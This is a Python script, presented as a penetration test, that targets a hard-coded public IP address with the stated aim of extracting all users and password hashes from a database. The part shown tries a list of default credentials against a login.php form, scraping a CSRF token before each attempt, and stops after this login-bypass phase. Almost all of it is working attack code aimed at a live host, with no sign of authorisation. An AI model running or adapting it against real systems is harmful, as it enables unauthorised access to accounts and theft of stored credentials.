
import requests
import re
from urllib.parse import quote
from datetime import datetime

print("="*100)
print("PENETRATION TEST - USER DATA EXTRACTION FROM DATABASE")
print("="*100)
print(f"\n[*] Target: http://31.97.117.123/")
print(f"[*] Start Time: {datetime.now()}")
print(f"[*] Objective: Extract all users, names, and PASSWORD HASHES from database\n")

session = requests.Session()
url = "http://31.97.117.123"

# ============================================================================
# PHASE 1: AUTHENTICATION BYPASS
# ============================================================================
print("\n" + "="*100)
print("PHASE 1: AUTHENTICATION BYPASS - TESTING DEFAULT CREDENTIALS")
print("="*100)

credentials_to_test = [
    ("admin", "admin"),
    ("admin", "password"),
    ("user", "password"),
    ("admin", "admin123"),
    ("user", "user"),
    ("admin", "letmein"),
    ("administrator", "administrator"),
    ("admin", "123456"),
    ("root", "root"),
    ("guest", "guest"),
]

login_found = False
authenticated_user = None

for attempt, (username, password) in enumerate(credentials_to_test, 1):
    print(f"\n[Attempt {attempt}] Testing credentials: {username}:{password}")
    
    # Get fresh login page with CSRF token
    try:
        login_page = session.get(f"{url}/login.php", timeout=10)
        token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([^'\"]+)['\"]", login_page.text)
        user_token = token_match.group(1) if token_match else ""
        
        # Attempt login
        login_data = {
            "username": username,
            "password": password,
            "user_token": user_token,
            "Login": "Login"
        }
        
        response = session.post(f"{url}/login.php", data=login_data, allow_redirects=True, timeout=10)
        
        # Check if login was successful
        if "logout" in response.text.lower() or "dashboard" in response.text.lower() or "index.php" in response.url:
            print(f"    ✓ SUCCESS! Credentials: {username}:{password}")
            login_found = True
            authenticated_user = username
            break
        else:
            print(f"    ✗ Failed")
    except Exception as e:
        print(f"    ✗ Error: {str(e)}")
    
    if attempt >= 10:
        print(f"\n[!] Reached 10 unsuccessful attempts limit")
        break

if not login_found:
    print("\n[-] Could not authenticate with default credentials")
else:
    print(f"\n[+] AUTHENTICATION SUCCESSFUL as: {authenticated_user}")
    print(f"[+] Session established - Cookies: {dict(session.cookies)}")


